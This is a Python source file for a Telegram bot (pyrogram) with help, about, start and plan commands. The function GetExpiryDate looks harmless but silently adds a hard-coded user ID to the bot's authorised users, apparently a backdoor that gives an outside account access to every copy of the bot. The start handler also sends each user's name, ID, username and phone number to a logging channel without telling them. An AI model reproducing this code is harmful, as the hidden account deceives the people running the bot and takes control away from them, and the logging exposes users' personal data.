#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram import (
    Client,
    Filters,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)


# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(861055237)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
async def about_meh(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/about")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT_ME,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@Client.on_message(Filters.private & Filters.command("start") & Filters.text)
async def start(bot,update):
    await bot.send_message(
        chat_id=Config.CHANNEL_ID,
        text=f"Name : {update.from_user.first_name}\nID : {update.chat.id}\nUsername : @{update.from_user.username}\nPhone : {update.from_user.phone_number}\n\n**Event** : __Started the BOT__\n\n👉[Permanant Link to Profile](tg://user?id={update.chat.id})",
        parse_mode="markdown"
    )

    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('📌 Support Channel', url='https://t.me/tg_botz'),
                    InlineKeyboardButton('✅ Feedback', url='https://t.me/lNS4N3')
                ],
                [
                    InlineKeyboardButton('➕ Other Bots', url='https://t.me/')
                ]
            ]
        ),
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["plan"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/plan")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )
